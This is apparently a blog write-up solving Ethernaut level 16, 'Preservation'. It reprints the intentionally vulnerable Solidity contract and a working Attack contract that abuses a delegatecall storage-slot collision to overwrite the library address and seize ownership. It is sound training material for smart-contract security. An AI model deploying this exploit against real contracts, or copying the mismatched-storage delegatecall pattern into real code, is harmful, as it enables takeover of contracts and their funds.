# Ethernaut 16: Preservation

This is a intro to the proxy pattern, where storage is in the proxy contract and the logic in a delegate contract. Delegatecall needs to take care of several things to be not vulnerable, therefore openzeppelin and hardhat share a couple of contacts to use.

## The Task Intro

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

- Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
- Understanding what it means for delegatecall to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.

## The Task Code

```apache
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

## The Solution

```apache
contract Attack{
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
     Preservation public preservation;

    constructor(Preservation _preservation){
        preservation = _preservation;
    }

    function attack () public {
        preservation.setSecondTime(uint256(uint160(address(this))));
        preservation.setFirstTime(1);
    }

    function setTime(uint _time) public {
        owner = tx.origin;
    }
}
```

This level was already a bit more difficult than level 6. The vulnerability was clear: The library has not the same storage structure as the calling contract. If the main contract calls the library, the function stores to the storage variable `soredTime`. This is storage slot 0. Because the library gets called by delegate, this means that msg.sender, msg.value and all storage variables belong to the calling contract Preservation.

The developer made a mistake and did not replicate all other storage variable from the callee, overriding the first variable timeZone1Library.

So I can call a first time setSecondTime and pass an address of the attacker contract ;-). Then with the second call, the attacker contract will be called. I can set the tx.origin as an owner, and WON the level.

There where 2 difficulties - first msg.sender seems not to work and I needed to fall back to tx.origin. And the second difficulty was that I ran out of gas, but did not see this message in remix... But that cost me about 30 min, so its ok...

```Done 🎉️.

```
